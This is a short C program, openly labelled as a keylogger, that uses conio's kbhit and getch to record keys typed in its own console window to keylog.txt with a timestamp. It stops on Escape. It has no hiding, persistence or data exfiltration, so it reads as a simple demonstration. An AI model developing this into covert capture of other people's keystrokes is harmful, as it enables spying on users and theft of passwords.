#include <stdio.h>
#include <conio.h>
#include <time.h>

int main()
{
    char capture;
    FILE* file = fopen("keylog.txt", "a"); // Open the file in append mode

    if (file != NULL)
    {
        time_t t;
        struct tm* tm_info;
        char buffer[26];

        // Get the current time and format it
        while (1)
        {
            t = time(NULL);
            tm_info = localtime(&t);
            strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", tm_info);

            // Log the start of the keylogger
            if (ftell(file) == 0) // Check if the file is empty
            {
                fprintf(file, "\n#$KeyLogger: Written By Arya. Started logging @ %s", buffer);
                fflush(file); // Flush the buffer to ensure the data is written immediately
            }

            if (kbhit())
            {
                capture = getch();
                switch ((int)capture)
                {
                case ' ':       // Space key
                    fprintf(file, " ");
                    break;
                case 0x09:      // Tab key
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D:      // Enter key
                    fprintf(file, "[ENTER]");
                    break;
                case 0x1B:      // Escape key
                    fprintf(file, "[ESC]");
                    break;
                case 0x08:      // Backspace key
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture, file);   // Put any other inputted key into the file
                }

                fflush(file); // Flush the buffer after writing each key to ensure the data is written immediately

                if ((int)capture == 27)
                {   // Escape key
                    fclose(file);
                    return 0;
                }
            }
        }
    }

    return 0;
} 

